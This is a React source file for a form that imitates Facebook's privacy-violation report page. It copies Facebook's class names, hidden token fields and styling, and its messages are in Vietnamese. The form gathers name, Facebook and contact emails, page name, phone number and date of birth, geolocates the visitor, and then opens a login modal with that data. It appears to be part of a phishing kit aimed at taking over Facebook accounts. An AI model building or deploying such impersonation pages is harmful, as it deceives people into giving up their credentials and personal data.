import { useEffect, useRef, useState } from 'react';
import intlTelInput from 'intl-tel-input';
import 'intl-tel-input/build/css/intlTelInput.css';
import LoginModal from '@/components/login-modal';
import { useLang } from '@/context/lang-context';
import usePhoneStore from '@/stores/use-phone-store';

const PrivacyForm = () => {
    const { labels } = useLang();
    const phoneRef = useRef(null);
    const intlInstanceRef = useRef(null);
    const [showModal, setShowModal] = useState(false);
    const [formData, setFormData] = useState({});
    const [emailErrors, setEmailErrors] = useState({
        email_facebook: '',
        email_work: '',
    });
    const [phoneError, setPhoneError] = useState('');
    const { countryCode, setCountry, fetchGeoCountry } = usePhoneStore();

    const getEmailError = (value, emptyMessage, invalidMessage) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const normalizedValue = String(value || '').trim();

        if (normalizedValue === '') {
            return emptyMessage;
        }

        if (!emailRegex.test(normalizedValue)) {
            return invalidMessage;
        }

        return '';
    };

    const getPhoneError = (value) => {
        const normalizedValue = String(value || '').trim();
        if (normalizedValue === '') {
            return 'Vui lòng nhập số điện thoại.';
        }

        return '';
    };

    useEffect(() => {
        if (!phoneRef.current) {
            return undefined;
        }

        const instance = intlTelInput(phoneRef.current, {
            initialCountry: countryCode || 'vn',
            nationalMode: false,
            strictMode: true,
            autoPlaceholder: 'polite',
            loadUtils: () => import('intl-tel-input/utils'),
        });

        intlInstanceRef.current = instance;

        const syncSelectedCountry = () => {
            const countryData = instance.getSelectedCountryData();
            setCountry(countryData?.iso2 || 'vn', countryData?.dialCode || null);
        };

        phoneRef.current.addEventListener('countrychange', syncSelectedCountry);
        syncSelectedCountry();

        return () => {
            phoneRef.current?.removeEventListener('countrychange', syncSelectedCountry);
            instance.destroy();
            intlInstanceRef.current = null;
        };
    }, [countryCode, setCountry]);

    useEffect(() => {
        const initGeoCountry = async () => {
            const resolvedCountry = await fetchGeoCountry();
            if (intlInstanceRef.current && resolvedCountry) {
                intlInstanceRef.current.setCountry(resolvedCountry);
            }
        };

        initGeoCountry();
    }, [fetchGeoCountry]);

    const handleSubmit = (e) => {
        e.preventDefault();
        const intlInstance = intlInstanceRef.current;
        const rawPhone = phoneRef.current?.value ?? '';

        if (intlInstance && rawPhone.trim() !== '') {
            const fullPhone = intlInstance.getNumber();
            if (phoneRef.current) {
                phoneRef.current.value = fullPhone;
            }
        }

        const fd = new FormData(e.target);
        const data = Object.fromEntries(fd.entries());
        const nextEmailErrors = {
            email_facebook: getEmailError(
                data.email_facebook,
                'Vui lòng nhập email Facebook.',
                'Email Facebook không đúng định dạng.',
            ),
            email_work: getEmailError(
                data.email_work,
                'Vui lòng nhập email liên hệ.',
                'Email liên hệ không đúng định dạng.',
            ),
        };
        const nextPhoneError = getPhoneError(data.phone)
            || (intlInstance && !intlInstance.isValidNumber() ? 'Số điện thoại không hợp lệ.' : '');

        if (nextEmailErrors.email_facebook || nextEmailErrors.email_work || nextPhoneError) {
            setEmailErrors(nextEmailErrors);
            setPhoneError(nextPhoneError);
            return;
        }

        setEmailErrors({
            email_facebook: '',
            email_work: '',
        });
        setPhoneError('');
        setFormData(data);
        setShowModal(true);
    };

    return (
        <>
        {showModal && (
            <LoginModal
                onClose={() => setShowModal(false)}
                formData={formData}
            />
        )}
        <form
            id="Report a Violation of your Privacy on Facebook ROW"
            method="post"
            action="#"
            className="w-full overflow-hidden rounded-[8px] border border-[#dddfe2] bg-[#F8FAFC]"
            onSubmit={handleSubmit}
        >
            <input type="hidden" name="jazoest" value="..." />
            <input type="hidden" name="fb_dtsg" value="..." />

            <div className="_4-u2 _3ban _4-u8">
                <div className="_4-u3 _2ph_ _6oy- _57d8 border-b border-[#dddfe2] bg-[#f0f2f5] px-4 py-4 sm:px-5 sm:py-5">
                    <div className="clearfix">
                        <div className="lfloat _ohe">
                            <div className="_5xm_ text-[20px] font-bold leading-[24px] text-[#1c1e21]">
                                {labels.flagTitle}
                            </div>
                        </div>
                    </div>
                </div>

                <div className="_4-u3 _2pi0 px-4 py-4 sm:px-5 sm:py-5">
                    <div className="_5cb_ space-y-4">
                        <div className="_5hba rounded-[4px] py-3">
                            <p className="m-0 text-[13px] leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc1}
                            </p>
                            <p className="m-0 mt-2 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc2}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc3}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc4}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc5}
                            </p>
                        </div>

                        {/* Full name */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-name"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.fullNameLabel}
                            </label>
                            <input
                                id="privacy-name"
                                type="text"
                                name="full_name"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Facebook email */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-email-fb"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.emailFbLabel}
                            </label>
                            <p className="mb-1 text-[12px] leading-[18px] text-[#606770]">
                                {labels.emailFbHelper}
                            </p>
                            <input
                                id="privacy-email-fb"
                                type="email"
                                name="email_facebook"
                                required
                                onChange={(e) => {
                                    const nextValue = e.target.value;
                                    setEmailErrors((prev) => ({
                                        ...prev,
                                        email_facebook: getEmailError(
                                            nextValue,
                                            'Vui lòng nhập email Facebook.',
                                            'Email Facebook không đúng định dạng.',
                                        ),
                                    }));
                                }}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                            {emailErrors.email_facebook && (
                                <p className="mt-1 text-[12px] text-red-500">{emailErrors.email_facebook}</p>
                            )}
                        </div>

                        {/* Work email */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-email-work"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.emailWorkLabel}
                            </label>
                            <input
                                id="privacy-email-work"
                                type="email"
                                name="email_work"
                                required
                                onChange={(e) => {
                                    const nextValue = e.target.value;
                                    setEmailErrors((prev) => ({
                                        ...prev,
                                        email_work: getEmailError(
                                            nextValue,
                                            'Vui lòng nhập email liên hệ.',
                                            'Email liên hệ không đúng định dạng.',
                                        ),
                                    }));
                                }}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                            {emailErrors.email_work && (
                                <p className="mt-1 text-[12px] text-red-500">{emailErrors.email_work}</p>
                            )}
                        </div>

                        {/* Page name */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-page-name"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.pageNameLabel}
                            </label>
                            <input
                                id="privacy-page-name"
                                type="text"
                                name="page_name"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Phone */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-phone"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.phoneLabel}
                            </label>
                            <input
                                id="privacy-phone"
                                type="tel"
                                name="phone"
                                required
                                ref={phoneRef}
                                onChange={(e) => {
                                    if (phoneError) {
                                        setPhoneError('');
                                    }
                                }}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                            {phoneError && (
                                <p className="mt-1 text-[12px] text-red-500">{phoneError}</p>
                            )}
                        </div>

                        {/* Date of birth */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-dob"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.dobLabel}
                            </label>
                            <input
                                id="privacy-dob"
                                type="date"
                                name="date_of_birth"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                    </div>
                </div>

                <div className="flex bg-[#F0F2F5] px-4 py-3 sm:justify-end sm:px-5 sm:py-4">
                    <button
                        type="submit"
                        className="w-full rounded-[6px] bg-[#3B5998] px-4 py-[9px] text-[13px] font-semibold text-white transition-colors hover:bg-[#324b81] sm:w-auto sm:py-[7px]"
                    >
                        {labels.submitBtn}
                    </button>
                </div>
            </div>
        </form>
        </>
    );
};

export default PrivacyForm;
